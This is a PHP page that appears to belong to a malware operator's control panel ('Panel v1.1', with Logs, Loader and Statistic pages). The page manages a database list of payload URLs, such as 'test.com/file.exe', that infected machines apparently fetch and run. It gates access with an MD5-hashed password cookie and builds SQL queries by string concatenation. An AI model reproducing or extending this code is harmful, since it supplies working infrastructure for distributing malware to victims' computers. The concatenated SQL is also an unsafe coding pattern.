<?php
error_reporting(0);
require("mysql.php");

if ($_COOKIE["pwd"] === md5($panel_password)){
    if(isset($_POST['del'])){
        $request = "SELECT * FROM `loader`";
        $ans = $base->query($request);
        $row = $ans->fetchAll();

        $tempArray = json_decode($row[0]['loader'], true);
        
        unset($tempArray[0]);
        $tempArray = array_values($tempArray);
        $tempArray = (object) array_filter((array) $tempArray);
        
        $out = json_encode($tempArray);
        $qr = $base->query("UPDATE `loader` SET `loader`='".$out."'");
	$qr->fetchAll();
    }
    
    if(isset($_POST['loader'])){
        //$answer = $base->query("UPDATE `loader` SET `loader`='".htmlspecialchars($_POST['loader'])."'");
	//$answer->fetchAll();
                
        $request = "SELECT * FROM `loader`";
        $ans = $base->query($request);
        $row = $ans->fetchAll();
                
        $tempArray = json_decode($row[0]['loader'], true);
                
        array_push($tempArray, htmlspecialchars($_POST['loader']));
        $tempArray = array_values($tempArray);
        $tempArray = (object) array_filter((array) $tempArray);
                
        $jsonData = json_encode($tempArray);
        $answer = $base->query("UPDATE `loader` SET `loader`='".$jsonData."'");
	$answer->fetchAll();
        unset($_POST['loader']);
    }
?>

<html>
 <head>
  <meta charset="utf-8">
  <title>Loader</title>
  <link href="bootstrap.css" rel="stylesheet" id="bootstrap-css">
  <link rel="stylesheet" href="w3.css">
  <link href="bar.css" rel="stylesheet" id="bootstrap-css">
 </head>
 <body class="w3-light-gray">
 
<div class="w3-sidebar w3-light-gray w3-bar-block w3-collapse w3-card w3-animate-left" style="width:200px;" id="mySidebar">
  <h4 class="w3-bar-item w3-red">Panel v1.1</h4>
  <a class="w3-bar-item w3-button" href="index.php">Logs</a>
  <a class="w3-bar-item w3-button" href="loader.php">Loader</a>
  <a class="w3-bar-item w3-button" href="stat.php">Statistic</a>
  <a class="w3-bar-item w3-button" href="features.php">Features</a>
</div>

<div class="main">
    
<div class="w3-panel w3-card-4 w3-red w3-display-container">
  <span onclick="this.parentElement.style.display='none'"
  class="w3-button w3-large w3-display-topright">&times;</span>
  <h6 style="color: white;">Info!</h6>
  <h5 style="color: white;">'+' button will add url to loader url list</h5>
</div>
<br>

    <div class="w3-container">
  <table class="w3-table w3-bordered">
    <thead>
      <tr>
        <th>Url</th>
        <th>Action</th>
      </tr>
    </thead>  
<?php
$request = "SELECT * FROM `loader`";
$answ = $base->query($request);
$row = $answ->fetchAll();

//if (($key = array_search("test.com/file.exe", $tempArray)) !== false) {
//    unset($tempArray[$key]);
//    $tempArray = array_values($tempArray);
//}

$tempArray = json_decode($row[0]['loader'], true);
for($i = 0; $i < count($tempArray); $i++){
    echo '
    <tr>
      <td>'.$tempArray[$i].'</td>
      <td><form action="loader.php" style="display:inline-block;" method="POST">
      <button type="submit" class="btn w3-round-xlarge w3-border w3-border-red" name="del" value="'.$tempArray[$i].'">Remove
      </button></td>
    </tr>';
}  
?> 
  </table>
</div>  
 
<br>
    
<form name="test" method="POST" action="loader.php">
<input type="text" name="loader" class="w3-input w3-border-blue">
<button type="submit" class="btn w3-round-xxlarge w3-border w3-border-red" style="margin-top: 20px;">+</button>
</form>
	
</div>
  
 </body>
</html>
<?php
}else{
	header("location: login.php");
}
?>